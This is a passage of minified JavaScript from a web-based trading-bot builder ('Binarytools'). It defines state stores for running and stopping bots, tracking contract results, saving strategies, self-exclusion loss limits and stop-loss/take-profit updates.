                            setAdditionalData: s.aD,
                            setCurrentDurationMinMax: s.aD,
                            setFormVisibility: s.aD,
                            setSelectedStrategy: s.aD,
                            setLossThresholdWarningData: s.aD,
                            setValue: s.aD,
                            toggleStopBotDialog: s.aD
                        }), this.root_store = e, (0, s.U5)(() => this.is_open, () => {
                            !this.is_open && (this.selected_strategy = "MARTINGALE")
                        })
                    }
                }
                var e8 = n("80177");
                let te = Object.freeze({
                        SUMMARY: 0,
                        TRANSACTIONS: 1,
                        JOURNAL: 2
                    }),
                    tt = {
                        keep_current_contract: (0, i.jsx)(m.Xx, {
                            i18n_default_text: "Would you like to keep your current contract or close it? If you decide to keep it running, you can check and close it later on the <0>Reports</0> page.",
                            components: [(0, i.jsx)("a", {
                                className: "link",
                                rel: "noopener noreferrer",
                                target: "_blank",
                                href: "/reports/positions"
                            }, 0)]
                        })
                    };
                class tn {
                    get statistics() {
                        let e = 0,
                            {
                                transactions: t
                            } = this.root_store.transactions,
                            n = t.reduce((t, n) => {
                                let {
                                    data: a
                                } = n;
                                return a.is_completed && (a.profit > 0 ? !a.is_virtual_trade && (t.won_contracts += 1, t.total_payout += a.payout) : !a.is_virtual_trade && (t.lost_contracts += 1), !a.is_virtual_trade && (t.total_profit += a.profit, t.total_stake += a.buy_price, e += 1)), t
                            }, {
                                lost_contracts: 0,
                                number_of_runs: 0,
                                total_profit: 0,
                                total_payout: 0,
                                total_stake: 0,
                                won_contracts: 0
                            });
                        return n.number_of_runs = e, n
                    }
                    get is_stop_button_visible() {
                        return this.is_running || this.has_open_contract
                    }
                    get is_stop_button_disabled() {
                        return !this.is_contracy_buying_in_progress && [e8.K.PURCHASE_SENT, e8.K.IS_STOPPING].includes(this.contract_stage)
                    }
                    get is_clear_stat_disabled() {
                        var e;
                        let {
                            journal: t,
                            transactions: n
                        } = this.root_store;
                        return this.is_running || this.has_open_contract || 0 === t.unfiltered_messages.length && (null == n ? void 0 : null === (e = n.transactions) || void 0 === e ? void 0 : e.length) === 0
                    }
                    constructor(e, t) {
                        (0, o._)(this, "root_store", void 0), (0, o._)(this, "dbot", void 0), (0, o._)(this, "core", void 0), (0, o._)(this, "disposeReactionsFn", void 0), (0, o._)(this, "timer", void 0), (0, o._)(this, "active_index", 0), (0, o._)(this, "contract_stage", e8.K.NOT_RUNNING), (0, o._)(this, "dialog_options", {}), (0, o._)(this, "has_open_contract", !1), (0, o._)(this, "is_running", !1), (0, o._)(this, "is_statistics_info_modal_open", !1), (0, o._)(this, "is_drawer_open", !0), (0, o._)(this, "is_dialog_open", !1), (0, o._)(this, "is_sell_requested", !1), (0, o._)(this, "show_bot_stop_message", !1), (0, o._)(this, "is_contracy_buying_in_progress", !1), (0, o._)(this, "run_id", ""), (0, o._)(this, "onOkButtonClick", null), (0, o._)(this, "onCancelButtonClick", null), (0, o._)(this, "error_type", void 0), (0, o._)(this, "setShowBotStopMessage", e => {
                            this.show_bot_stop_message = e, e && (0, C.J)((0, O.xG)().bot_stop, {
                                label: (0, m.NC)("Reports"),
                                onClick: () => {
                                    let e = (0, u.dd)(),
                                        t = new URL(d.xOw.positions);
                                    t.searchParams.set("contract_type_bots", e), window.location.assign(t.toString())
                                }
                            })
                        }), (0, o._)(this, "performSelfExclusionCheck", async () => {
                            let {
                                self_exclusion: e
                            } = this.root_store;
                            await e.checkRestriction()
                        }), (0, o._)(this, "onRunButtonClick", async () => {
                            let e = 1;
                            window.sendRequestsStatistic && (performance.clearMeasures(), this.timer = setInterval(() => {
                                window.sendRequestsStatistic(!0), performance.clearMeasures(), 12 === e ? clearInterval(this.timer) : e++
                            }, 1e4));
                            let {
                                summary_card: t,
                                self_exclusion: n
                            } = this.root_store, {
                                client: a,
                                ui: i
                            } = this.core, l = "iOS" === (0, d._Xx)();
                            if (this.dbot.saveRecentWorkspace(), this.dbot.unHighlightAllBlocks(), !a.is_logged_in) {
                                this.showLoginDialog();
                                return
                            }
                            if ((l || (0, d.G6W)()) && this.preloadAudio(), !n.should_bot_run) {
                                n.setIsRestricted(!0);
                                return
                            }
                            if (n.setIsRestricted(!1), this.registerBotListeners(), !this.dbot.shouldRunBot()) {
                                this.unregisterBotListeners();
                                return
                            }
                            null == i || i.setAccountSwitcherDisabledMessage((0, m.NC)("Account switching is disabled while your bot is running. Please stop your bot before switching accounts.")), (0, s.z)(() => {
                                this.setIsRunning(!0), i.setPromptHandler(!0), this.toggleDrawer(!0), this.run_id = `run-${Date.now()}`, t.clear(), this.setContractStage(e8.K.STARTING), this.dbot.runBot()
                            }), this.setShowBotStopMessage(!1)
                        }), (0, o._)(this, "onStopButtonClick", () => {
                            this.is_contracy_buying_in_progress = !1;
                            let {
                                is_multiplier: e
                            } = this.root_store.summary_card;
                            e ? this.showStopMultiplierContractDialog() : this.stopBot()
                        }), (0, o._)(this, "onStopBotClick", () => {
                            let {
                                is_multiplier: e
                            } = this.root_store.summary_card, {
                                summary_card: t
                            } = this.root_store;
                            e ? this.showStopMultiplierContractDialog() : (this.stopBot(), t.clear(), this.setShowBotStopMessage(!0))
                        }), (0, o._)(this, "stopBot", () => {
                            let {
                                ui: e
                            } = this.core;
                            this.dbot.stopBot(), e.setPromptHandler(!1), this.error_type ? (this.setContractStage(e8.K.NOT_RUNNING), e.setAccountSwitcherDisabledMessage(), this.setIsRunning(!1)) : this.has_open_contract ? this.setContractStage(e8.K.IS_STOPPING) : (this.setContractStage(e8.K.NOT_RUNNING), this.unregisterBotListeners(), e.setAccountSwitcherDisabledMessage(), this.setIsRunning(!1)), this.error_type && (this.error_type = void 0), this.timer && clearInterval(this.timer), window.sendRequestsStatistic && (window.sendRequestsStatistic(!0), performance.clearMeasures())
                        }), (0, o._)(this, "onClearStatClick", () => {
                            this.showClearStatDialog()
                        }), (0, o._)(this, "clearStat", () => {
                            let {
                                summary_card: e,
                                journal: t,
                                transactions: n
                            } = this.root_store;
                            this.setIsRunning(!1), this.setHasOpenContract(!1), this.clear(), t.clear(), e.clear(), n.clear(), this.setContractStage(e8.K.NOT_RUNNING)
                        }), (0, o._)(this, "toggleStatisticsInfoModal", () => {
                            this.is_statistics_info_modal_open = !this.is_statistics_info_modal_open
                        }), (0, o._)(this, "toggleDrawer", e => {
                            this.is_drawer_open = e
                        }), (0, o._)(this, "setActiveTabIndex", e => {
                            this.active_index = e
                        }), (0, o._)(this, "onCloseDialog", () => {
                            this.is_dialog_open = !1
                        }), (0, o._)(this, "stopMyBot", () => {
                            let {
                                summary_card: e,
                                quick_strategy: t
                            } = this.root_store, {
                                ui: n
                            } = this.core, {
                                toggleStopBotDialog: a
                            } = t;
                            n.setPromptHandler(!1), this.dbot.terminateBot(), this.onCloseDialog(), e.clear(), a(), this.timer && clearInterval(this.timer), window.sendRequestsStatistic && (window.sendRequestsStatistic(!0), performance.clearMeasures())
                        }), (0, o._)(this, "closeMultiplierContract", () => {
                            let {
                                quick_strategy: e
                            } = this.root_store, {
                                toggleStopBotDialog: t
                            } = e;
                            this.onClickSell(), this.stopBot(), this.onCloseDialog(), t()
                        }), (0, o._)(this, "showStopMultiplierContractDialog", () => {
                            let {
                                summary_card: e
                            } = this.root_store, {
                                ui: t
                            } = this.core;
                            this.onOkButtonClick = () => {
                                t.setPromptHandler(!1), this.dbot.terminateBot(), this.timer && clearInterval(this.timer), window.sendRequestsStatistic && (window.sendRequestsStatistic(!0), performance.clearMeasures()), this.onCloseDialog(), e.clear()
                            }, this.onCancelButtonClick = () => {
                                this.onClickSell(), this.stopBot(), this.onCloseDialog()
                            }, this.dialog_options = {
                                title: (0, m.NC)("Keep your current contract?"),
                                message: tt.keep_current_contract,
                                ok_button_text: (0, m.NC)("Keep my contract"),
                                cancel_button_text: (0, m.NC)("Close my contract")
                            }, this.is_dialog_open = !0
                        }), (0, o._)(this, "showLoginDialog", () => {
                            this.onOkButtonClick = this.onCloseDialog, this.onCancelButtonClick = null, this.dialog_options = {
                                title: (0, m.NC)("Please log in"),
                                message: (0, m.NC)("You need to log in to run the bot.")
                            }, this.is_dialog_open = !0
                        }), (0, o._)(this, "showRealAccountDialog", () => {
                            this.onOkButtonClick = this.onCloseDialog, this.onCancelButtonClick = null, this.dialog_options = {
                                title: (0, m.NC)("Binarytools isn't quite ready for real accounts"),
                                message: (0, m.NC)("Please switch to your demo account to run your Binarytools.")
                            }, this.is_dialog_open = !0
                        }), (0, o._)(this, "showClearStatDialog", () => {
                            this.onOkButtonClick = () => {
                                this.clearStat(), this.onCloseDialog()
                            }, this.onCancelButtonClick = this.onCloseDialog, this.dialog_options = {
                                title: (0, m.NC)("Are you sure?"),
                                message: (0, m.NC)("This will clear all data in the summary, transactions, and journal panels. All counters will be reset to zero.")
                            }, this.is_dialog_open = !0
                        }), (0, o._)(this, "showIncompatibleStrategyDialog", () => {
                            this.onOkButtonClick = this.onCloseDialog, this.onCancelButtonClick = null, this.dialog_options = {
                                title: (0, m.NC)("Import error"),
                                message: (0, m.NC)("This strategy is currently not compatible with Binarytools.")
                            }, this.is_dialog_open = !0
                        }), (0, o._)(this, "showContractUpdateErrorDialog", e => {
                            this.onOkButtonClick = this.onCloseDialog, this.onCancelButtonClick = null, this.dialog_options = {
                                title: (0, m.NC)("Contract Update Error"),
                                message: e
                            }, this.is_dialog_open = !0
                        }), (0, o._)(this, "registerBotListeners", () => {
                            let {
                                summary_card: e,
                                transactions: t
                            } = this.root_store;
                            c.observer.register("bot.running", this.onBotRunningEvent), c.observer.register("bot.sell", this.onBotSellEvent), c.observer.register("bot.stop", this.onBotStopEvent), c.observer.register("bot.bot_ready", this.onBotReadyEvent), c.observer.register("bot.click_stop", this.onStopButtonClick), c.observer.register("bot.trade_again", this.onBotTradeAgain), c.observer.register("contract.status", this.onContractStatusEvent), c.observer.register("bot.contract", this.onBotContractEvent), c.observer.register("bot.contract", e.onBotContractEvent), c.observer.register("bot.contract", t.onBotContractEvent), c.observer.register("Error", this.onError), c.observer.register("bot.recoverOpenPositionLimitExceeded", this.OpenPositionLimitExceededEvent)
                        }), (0, o._)(this, "OpenPositionLimitExceededEvent", () => this.is_contracy_buying_in_progress = !0), (0, o._)(this, "registerReactions", () => {
                            let e, t;
                            let {
                                client: n,
                                common: a
                            } = this.core, i = () => {
                                a.is_socket_opened ? e = (0, s.U5)(() => n.loginid, e => {
                                    e && this.is_running, this.dbot.terminateBot(), this.unregisterBotListeners()
                                }) : "function" == typeof t && t()
                            };
                            i(), t = (0, s.U5)(() => a.is_socket_opened, () => i());
                            let l = (0, s.U5)(() => !this.is_running, () => {
                                !this.is_running && this.setContractStage(e8.K.NOT_RUNNING)
                            });
                            return () => {
                                "function" == typeof e && e(), "function" == typeof t && t(), "function" == typeof l && l()
                            }
                        }), (0, o._)(this, "onBotRunningEvent", () => {
                            this.setHasOpenContract(!0);
                            let e = new Event("IgnorePWAUpdate");
                            document.dispatchEvent(e);
                            let {
                                self_exclusion: t
                            } = this.root_store;
                            t.should_bot_run && -1 !== t.run_limit && (t.run_limit -= 1, t.run_limit < 0 && this.onStopButtonClick())
                        }), (0, o._)(this, "onBotSellEvent", () => {
                            this.is_sell_requested = !0
                        }), (0, o._)(this, "onBotStopEvent", () => {
                            let {
                                self_exclusion: e,
                                summary_card: t
                            } = this.root_store, {
                                ui: n
                            } = this.core, a = () => {
                                this.error_type = void 0, this.setContractStage(e8.K.NOT_RUNNING), n.setAccountSwitcherDisabledMessage(), this.unregisterBotListeners(), e.resetSelfExclusion()
                            };
                            if (this.error_type === c.ErrorTypes.RECOVERABLE_ERRORS) {
                                var i, l, o, s;
                                let {
                                    shouldRestartOnError: e = !1,
                                    timeMachineEnabled: t = !1
                                } = (null === (s = this.dbot) || void 0 === s ? void 0 : null === (o = s.interpreter) || void 0 === o ? void 0 : null === (l = o.bot) || void 0 === l ? void 0 : null === (i = l.tradeEngine) || void 0 === i ? void 0 : i.options) ? ? {};
                                e || t ? (this.error_type = void 0, this.setContractStage(e8.K.PURCHASE_SENT)) : (this.setIsRunning(!1), a())
                            } else this.error_type === c.ErrorTypes.UNRECOVERABLE_ERRORS ? (this.setIsRunning(!1), a()) : this.has_open_contract && (this.error_type = void 0, this.is_sell_requested = !1, this.setContractStage(e8.K.CONTRACT_CLOSED), n.setAccountSwitcherDisabledMessage(), this.unregisterBotListeners(), e.resetSelfExclusion());
                            this.setHasOpenContract(!1), t.clearContractUpdateConfigValues();
                            let r = new Event("ListenPWAUpdate");
                            document.dispatchEvent(r)
                        }), (0, o._)(this, "onBotReadyEvent", () => {
                            this.setIsRunning(!1), c.observer.unregisterAll("bot.bot_ready")
                        }), (0, o._)(this, "onBotTradeAgain", e => {
                            !e && this.stopBot()
                        }), (0, o._)(this, "onContractStatusEvent", e => {
                            switch (e.id) {
                                case "contract.purchase_sent":
                                    this.setContractStage(e8.K.PURCHASE_SENT);
                                    break;
                                case "contract.purchase_received":
                                    {
                                        this.is_contracy_buying_in_progress = !1,
                                        this.setContractStage(e8.K.PURCHASE_RECEIVED);
                                        let {
                                            buy: n
                                        } = e,
                                        {
                                            is_virtual: a
                                        } = this.core.client;
                                        if (!a && n) {
                                            var t;
                                            null === eS.default || void 0 === eS.default || null === (t = eS.default.pushDataLayer) || void 0 === t || t.call(eS.default, {
                                                event: "dbot_purchase",
                                                buy_price: n.buy_price
                                            })
                                        }
                                        break
                                    }
                                case "contract.sold":
                                    this.is_sell_requested = !1, this.setContractStage(e8.K.CONTRACT_CLOSED), e.contract && eS.default.onTransactionClosed(e.contract)
                            }
                        }), (0, o._)(this, "onClickSell", () => {
                            let {
                                is_multiplier: e
                            } = this.root_store.summary_card;
                            e && this.setContractStage(e8.K.IS_STOPPING), this.dbot.interpreter.bot.getInterface().sellAtMarket()
                        }), (0, o._)(this, "clear", () => {
                            c.observer.emit("statistics.clear")
                        }), (0, o._)(this, "onBotContractEvent", e => {
                            (null == e ? void 0 : e.is_sold) && (this.is_sell_requested = !1, this.setContractStage(e8.K.CONTRACT_CLOSED))
                        }), (0, o._)(this, "onError", e => {
                            let t = e.error || e;
                            c.unrecoverable_errors.includes(t.code) ? (this.root_store.summary_card.clear(), this.error_type = c.ErrorTypes.UNRECOVERABLE_ERRORS) : this.error_type = c.ErrorTypes.RECOVERABLE_ERRORS;
                            let n = null == t ? void 0 : t.message;
                            this.showErrorMessage(n)
                        }), (0, o._)(this, "showErrorMessage", e => {
                            let {
                                journal: t
                            } = this.root_store, {
                                ui: n
                            } = this.core;
                            t.onError(e), t.journal_filters.some(e => e === c.MessageTypes.ERROR) && (this.toggleDrawer(!0), this.setActiveTabIndex(te.JOURNAL), n.setPromptHandler(!1))
                        }), (0, o._)(this, "switchToJournal", () => {
                            let {
                                journal: e
                            } = this.root_store;
                            e.journal_filters.push(c.MessageTypes.ERROR), this.setActiveTabIndex(te.JOURNAL), this.toggleDrawer(!0)
                        }), (0, o._)(this, "unregisterBotListeners", () => {
                            c.observer.unregisterAll("bot.running"), c.observer.unregisterAll("bot.stop"), c.observer.unregisterAll("bot.click_stop"), c.observer.unregisterAll("bot.trade_again"), c.observer.unregisterAll("contract.status"), c.observer.unregisterAll("bot.contract"), c.observer.unregisterAll("Error")
                        }), (0, o._)(this, "setContractStage", e => {
                            this.contract_stage = e
                        }), (0, o._)(this, "setHasOpenContract", e => {
                            this.has_open_contract = e
                        }), (0, o._)(this, "setIsRunning", e => {
                            this.is_running = e
                        }), (0, o._)(this, "onMount", () => {
                            let {
                                journal: e
                            } = this.root_store;
                            c.observer.register("ui.log.error", this.showErrorMessage), c.observer.register("ui.log.notify", e.onNotify), c.observer.register("ui.log.success", e.onLogSuccess), c.observer.register("client.invalid_token", this.handleInvalidToken)
                        }), (0, o._)(this, "onUnmount", () => {
                            let {
                                journal: e,
                                summary_card: t,
                                transactions: n
                            } = this.root_store;
                            !this.is_running && (this.unregisterBotListeners(), this.disposeReactionsFn(), e.disposeReactionsFn(), t.disposeReactionsFn(), n.disposeReactionsFn()), c.observer.unregisterAll("ui.log.error"), c.observer.unregisterAll("ui.log.notify"), c.observer.unregisterAll("ui.log.success"), c.observer.unregisterAll("client.invalid_token")
                        }), (0, o._)(this, "handleInvalidToken", async () => {
                            this.setActiveTabIndex(te.SUMMARY)
                        }), (0, o._)(this, "preloadAudio", () => {
                            this.dbot.getStrategySounds().forEach(e => {
                                let t = document.getElementById(e);
                                t && (t.muted = !0, t.play().catch(() => {}), t.pause(), t.muted = !1)
                            })
                        }), (0, s.rC)(this, {
                            active_index: s.LO,
                            contract_stage: s.LO,
                            dialog_options: s.LO,
                            has_open_contract: s.LO,
                            is_running: s.LO,
                            is_statistics_info_modal_open: s.LO,
                            is_drawer_open: s.LO,
                            is_dialog_open: s.LO,
                            is_sell_requested: s.LO,
                            run_id: s.LO,
                            error_type: s.LO,
                            show_bot_stop_message: s.LO,
                            is_stop_button_visible: s.Fl,
                            is_stop_button_disabled: s.Fl,
                            is_clear_stat_disabled: s.Fl,
                            toggleDrawer: s.aD,
                            onBotSellEvent: s.aD,
                            setContractStage: s.aD,
                            setHasOpenContract: s.aD,
                            setIsRunning: s.aD,
                            onRunButtonClick: s.aD,
                            is_contracy_buying_in_progress: s.LO,
                            OpenPositionLimitExceededEvent: s.aD,
                            onStopButtonClick: s.aD,
                            onClearStatClick: s.aD,
                            clearStat: s.aD,
                            toggleStatisticsInfoModal: s.aD,
                            setActiveTabIndex: s.aD,
                            onCloseDialog: s.aD,
                            stopMyBot: s.aD,
                            closeMultiplierContract: s.aD,
                            showStopMultiplierContractDialog: s.aD,
                            showLoginDialog: s.aD,
                            showRealAccountDialog: s.aD,
                            showClearStatDialog: s.aD,
                            showIncompatibleStrategyDialog: s.aD,
                            showContractUpdateErrorDialog: s.aD,
                            registerBotListeners: s.aD,
                            registerReactions: s.aD,
                            onBotRunningEvent: s.aD,
                            onBotStopEvent: s.aD,
                            onBotReadyEvent: s.aD,
                            onBotTradeAgain: s.aD,
                            onContractStatusEvent: s.aD,
                            onClickSell: s.aD,
                            clear: s.aD,
                            onBotContractEvent: s.aD,
                            onError: s.aD,
                            showErrorMessage: s.aD,
                            switchToJournal: s.aD,
                            unregisterBotListeners: s.aD,
                            handleInvalidToken: s.aD,
                            preloadAudio: s.aD,
                            onMount: s.aD,
                            onUnmount: s.aD
                        }), this.root_store = e, this.dbot = this.root_store.dbot, this.core = t, this.disposeReactionsFn = this.registerReactions(), this.timer = null
                    }
                }
                var ta = n("69483"),
                    ti = n.n(ta);
                let tl = window.Blockly;
                class to {
                    constructor(e) {
                        (0, o._)(this, "root_store", void 0), (0, o._)(this, "is_save_modal_open", !1), (0, o._)(this, "button_status", eO.NORMAL), (0, o._)(this, "bot_name", ""), (0, o._)(this, "toggleSaveModal", () => {
                            !this.is_save_modal_open && this.setButtonStatus(eO.NORMAL), this.is_save_modal_open = !this.is_save_modal_open
                        }), (0, o._)(this, "validateBotName", e => {
                            let t = {};
                            return "" === e.bot_name.trim() && (t.bot_name = (0, m.NC)("Strategy name cannot be empty")), t
                        }), (0, o._)(this, "addStrategyToWorkspace", async (e, t, n, a, i) => {
                            try {
                                var l;
                                let o = await (0, c.getSavedWorkspaces)(),
                                    s = o.findIndex(t => t.id === e),
                                    {
                                        load_modal: {
                                            getSaveType: r
                                        }
                                    } = this.root_store,
                                    d = t ? c.save_types.LOCAL : c.save_types.GOOGLE_DRIVE,
                                    u = n ? c.save_types.UNSAVED : d,
                                    m = null === (l = r(u)) || void 0 === l ? void 0 : l.toLowerCase(),
                                    b = {
                                        id: e,
                                        xml: window.Blockly.Xml.domToText(i),
                                        name: a,
                                        timestamp: Date.now(),
                                        save_type: m
                                    };
                                s >= 0 ? o[s] = b : o.push(b), o.sort((e, t) => new Date(e.timestamp) - new Date(t.timestamp)).reverse(), o.length > p.xc && o.pop();
                                let {
                                    load_modal: f
                                } = this.root_store, {
                                    setRecentStrategies: _
                                } = f;
                                ti().setItem("saved_workspaces", eK().compress(JSON.stringify(o)));
                                let h = await (0, c.getSavedWorkspaces)();
                                _(h);
                                let {
                                    dashboard: {
                                        setStrategySaveType: v
                                    }
                                } = this.root_store;
                                v(m)
                            } catch (e) {
                                c.observer.emit("Error", e)
                            }
                        }), (0, o._)(this, "onConfirmSave", async e => {
                            var t, n, a, i, l, o;
                            let s, {
                                    is_local: r,
                                    save_as_collection: d,
                                    bot_name: u
                                } = e,
                                {
                                    load_modal: m,
                                    dashboard: b,
                                    google_drive: p
                                } = this.root_store,
                                {
                                    loadStrategyToBuilder: f,
                                    selected_strategy: _
                                } = m,
                                {
                                    active_tab: h
                                } = b;
                            this.setButtonStatus(eO.LOADING);
                            let {
                                saveFile: v
                            } = p, y = null;
                            if (2 === h ? s = null === (a = window.Blockly) || void 0 === a ? void 0 : null === (n = a.Xml) || void 0 === n ? void 0 : n.workspaceToDom(null === (t = window.Blockly) || void 0 === t ? void 0 : t.derivWorkspace) : ((y = null === (i = (await (0, c.getSavedWorkspaces)()).filter(e => e.id === _.id)) || void 0 === i ? void 0 : i[0]).name = u, y.save_type = r ? c.save_types.LOCAL : c.save_types.GOOGLE_DRIVE, s = window.Blockly.utils.xml.textToDom(y.xml)), s.setAttribute("is_dbot", "true"), s.setAttribute("collection", d ? "true" : "false"), r ? (0, c.save)(u, d, s) : (await v({
                                    name: u,
                                    content: null == tl ? void 0 : null === (l = tl.Xml) || void 0 === l ? void 0 : l.domToPrettyText(s),
                                    mimeType: "application/xml"
                                }), this.setButtonStatus(eO.COMPLETED)), this.updateBotName(u), 1 === h) {
                                let e = _.id ? ? (null == tl ? void 0 : null === (o = tl.utils) || void 0 === o ? void 0 : o.genUid());
                                await this.addStrategyToWorkspace(e, r, d, u, s), y && await f(y)
                            } else await (0, c.saveWorkspaceToRecent)(s, r ? c.save_types.LOCAL : c.save_types.GOOGLE_DRIVE);
                            this.toggleSaveModal()
                        }), (0, o._)(this, "updateBotName", e => {
                            this.bot_name = e
                        }), (0, o._)(this, "onDriveConnect", async () => {
                            let {
                                google_drive: e
                            } = this.root_store;
                            e.is_authorised ? e.signOut() : e.signIn()
                        }), (0, o._)(this, "setButtonStatus", e => {
                            this.button_status = e
                        }), (0, s.rC)(this, {
                            is_save_modal_open: s.LO,
                            button_status: s.LO,
                            bot_name: s.LO,
                            toggleSaveModal: s.aD.bound,
                            validateBotName: s.aD.bound,
                            onConfirmSave: s.aD.bound,
                            updateBotName: s.aD.bound,
                            onDriveConnect: s.aD.bound,
                            setButtonStatus: s.aD.bound
                        }), this.root_store = e
                    }
                }
                var ts = n("87383");
                class tr {
                    get initial_values() {
                        return {
                            form_max_losses: this.api_max_losses || "",
                            run_limit: -1 !== this.run_limit ? this.run_limit : ""
                        }
                    }
                    get should_bot_run() {
                        let {
                            client: e
                        } = this.core;
                        return (!e.is_eu || !!e.is_virtual || 0 !== this.api_max_losses && -1 !== this.run_limit) && !0
                    }
                    setIsRestricted(e) {
                        this.is_restricted = e
                    }
                    setApiMaxLosses(e) {
                        this.api_max_losses = e
                    }
                    setRunLimit(e) {
                        this.run_limit = e
                    }
                    resetSelfExclusion() {
                        this.is_restricted = !1, this.api_max_losses = 0, this.form_max_losses = 0, this.run_limit = -1
                    }
                    async checkRestriction() {
                        c.api_base.api && c.api_base.is_authorized && (0, ts.Bc)() && c.api_base.api.getSelfExclusion().then(e => {
                            let {
                                get_self_exclusion: t
                            } = e, {
                                max_losses: n
                            } = t;
                            n && this.setApiMaxLosses(n)
                        })
                    }
                    constructor(e, t) {
                        (0, o._)(this, "root_store", void 0), (0, o._)(this, "core", void 0), (0, o._)(this, "api_max_losses", 0), (0, o._)(this, "run_limit", -1), (0, o._)(this, "is_restricted", !1), (0, o._)(this, "form_max_losses", void 0), (0, s.rC)(this, {
                            api_max_losses: s.LO,
                            run_limit: s.LO,
                            is_restricted: s.LO,
                            initial_values: s.Fl,
                            should_bot_run: s.Fl,
                            setIsRestricted: s.aD.bound,
                            setApiMaxLosses: s.aD.bound,
                            setRunLimit: s.aD.bound,
                            resetSelfExclusion: s.aD.bound,
                            checkRestriction: s.aD.bound
                        }), this.root_store = e, this.core = t
                    }
                }
                var td = n("88817");
                let tc = e => {
                    let {
                        stop_loss: t,
                        take_profit: n
                    } = (0, d.gNN)(e);
                    return {
                        contract_update_stop_loss: t ? Math.abs(t).toString() : "",
                        contract_update_take_profit: n ? n.toString() : "",
                        has_contract_update_stop_loss: !!t,
                        has_contract_update_take_profit: !!n
                    }
                };
                class tu {
                    get is_contract_completed() {
                        var e;
                        return !!(null === (e = this.contract_info) || void 0 === e ? void 0 : e.is_sold) && this.root_store.run_panel.contract_stage !== e8.K.PURCHASE_RECEIVED
                    }
                    get is_contract_loading() {
                        return this.root_store.run_panel.is_running && null === this.contract_info || this.root_store.run_panel.contract_stage === e8.K.PURCHASE_SENT || this.root_store.run_panel.contract_stage === e8.K.STARTING
                    }
                    get is_contract_inactive() {
                        return !this.contract_info && !this.is_loading
                    }
                    get is_multiplier() {
                        var e;
                        return (0, d.L8o)(null === (e = this.contract_info) || void 0 === e ? void 0 : e.contract_type)
                    }
                    get is_accumulator() {
                        var e;
                        return (0, d.XtD)(null === (e = this.contract_info) || void 0 === e ? void 0 : e.contract_type)
                    }
                    clear() {
                        let e = !(arguments.length > 0) || void 0 === arguments[0] || arguments[0];
                        e && (this.contract_info = null), this.profit = 0, this.profit_loss = 0, this.indicative = 0, this.indicative_movement = "", this.profit_movement = ""
                    }
                    clearContractUpdateConfigValues() {
                        if (this.contract_info) {
                            let {
                                contract_update_stop_loss: e,
                                contract_update_take_profit: t,
                                has_contract_update_stop_loss: n,
                                has_contract_update_take_profit: a
                            } = tc(this.contract_info.limit_order);
                            this.contract_update_stop_loss = e, this.contract_update_take_profit = t, this.has_contract_update_stop_loss = n, this.has_contract_update_take_profit = a
                        }
                    }
                    getLimitOrder() {
                        let e = {};
                        return e.take_profit = this.has_contract_update_take_profit ? +(this.contract_update_take_profit ? ? 0) : 0, e.stop_loss = this.has_contract_update_stop_loss ? +(this.contract_update_stop_loss ? ? 0) : 0, e
                    }
                    onBotContractEvent(e) {
                        let {
                            profit: t
                        } = e, n = (0, d.Kq_)(e);
                        this.profit = t, this.contract_id !== e.id && (this.clear(!1), this.contract_id = e.id, this.indicative = n);
                        let a = {
                            profit: t,
                            indicative: n
                        };
                        Object.keys(a).forEach(e => {
                            let t = a[e],
                                n = this[e];
                            e in this && t && t !== n ? this[`${e}_movement`] = t && t > (this[e] || 0) ? "profit" : "loss" : "" !== this[`${e}_movement`] && (this.indicative_movement = ""), "profit" === e && (this.profit_loss = t), "indicative" === e && (this.indicative = t)
                        }), this.contract_info = e
                    }
                    onChange(e) {
                        let {
                            name: t,
                            value: n
                        } = e;
                        this[t] = n, this.validateProperty(t, n)
                    }
                    populateContractUpdateConfig(e) {
                        let t = tc(null == e ? void 0 : e.contract_update);
                        if (!(0, d.uvr)(this.contract_update_config, t)) {
                            Object.assign(this, t), this.contract_update_config = t;
                            let {
                                contract_update: a,
                                error: i
                            } = e;
                            if (this.contract_info && a && !i) {
                                var n;
                                this.contract_info.limit_order = Object.assign((null === (n = this.contract_info) || void 0 === n ? void 0 : n.limit_order) || {}, a)
                            }
                        }
                    }
                    setContractUpdateConfig(e, t) {
                        e && t && (this.has_contract_update_take_profit = !!e, this.has_contract_update_stop_loss = !!t, this.contract_update_take_profit = this.has_contract_update_take_profit ? +e : null, this.contract_update_stop_loss = this.has_contract_update_stop_loss ? +t : null)
                    }
                    setIsBotRunning() {
                        if (!this.is_contract_loading) {
                            this.is_bot_running = !1;
                            return
                        }
                        let e = setTimeout(() => {
                            this.is_contract_loading && (this.is_bot_running = !0, this.root_store.run_panel.setContractStage(e8.K.RUNNING))
                        }, 5e3);
                        return () => clearTimeout(e)
                    }
                    updateLimitOrder() {
                        var e, t, n, a;
                        let i = this.getLimitOrder();
                        (null === (e = this.contract_info) || void 0 === e ? void 0 : e.contract_id) && (null === (t = this.contract_info) || void 0 === t ? void 0 : t.contract_id) && (null === (a = c.api_base.api) || void 0 === a || a.send({
                            contract_update: 1,
                            contract_id: null === (n = this.contract_info) || void 0 === n ? void 0 : n.contract_id,
                            limit_order: i
                        }).then(e => {
                            this.populateContractUpdateConfig(e)
                        }).catch(e => {
                            var t;
                            this.root_store.run_panel.showContractUpdateErrorDialog(null == e ? void 0 : null === (t = e.error) || void 0 === t ? void 0 : t.message)
                        }))
                    }
                    setValidationErrorMessages(e, t) {
                        (!this.validation_errors[e] || this.validation_errors[e].filter(e => !t.includes(e)).concat(t.filter(t => !this.validation_errors[e].includes(t))).length) && (this.validation_errors[e] = t)
                    }
                    validateProperty(e, t) {
                        let n = this.validation_rules[e].trigger,
                            a = {
                                [e]: void 0 !== t ? t : this[e]
                            },
                            i = {
                                [e]: this.validation_rules[e].rules || []
                            };
                        n && Object.hasOwnProperty.call(this, n) && (a[n] = this[n], i[n] = this.validation_rules[n].rules || []);
                        let l = new d.cX8(a, i, this);
                        l.isPassed(), Object.keys(a).forEach(e => {
                            this.setValidationErrorMessages(e, l.errors.get(e))
                        })
                    }
                    registerReactions() {
                        let {
                            client: e
                        } = this.core;
                        return this.disposeSwitchAcountListener = (0, s.U5)(() => e.loginid, () => this.clear()), () => {
                            "function" == typeof this.disposeSwitchAcountListener && this.disposeSwitchAcountListener()
                        }
                    }
                    constructor(e, t) {
